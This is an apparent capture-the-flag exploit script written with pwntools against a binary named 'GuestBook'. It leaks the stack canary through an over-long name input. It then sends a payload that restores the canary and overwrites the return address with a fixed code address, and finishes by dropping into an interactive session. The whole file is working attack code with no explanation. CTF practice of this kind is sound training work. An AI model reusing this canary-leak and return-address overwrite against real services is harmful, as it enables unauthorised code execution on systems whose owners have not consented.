from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 1
gdb_is = 0
elf_path = "./GuestBook"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process(elf_path)
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug(elf_path,'b vuln')
    r = process(elf_path)
    gdb.attach(r,'b *0x000040143F')
    pause()
    pass

elf = ELF(elf_path)
rop = ROP(elf)
r.sendafter(b'name: ',b'A'*0x19)
r.recvuntil(b'Hello '+b'A'*0x19)
cancary = u64(b'\x00' + r.recv(7))
r.sendlineafter(b'leave(MAX 4): ',b'2')
payload = b'A'* 0x98 +b'B' +p64(cancary)[1:] + b'A'*8 +p64(0x4012bb+5)
r.sendline(payload)
time.sleep(1)
payload = b'A'* (0x98 -0x20) + b'\x00' 
r.sendline(payload)

r.interactive()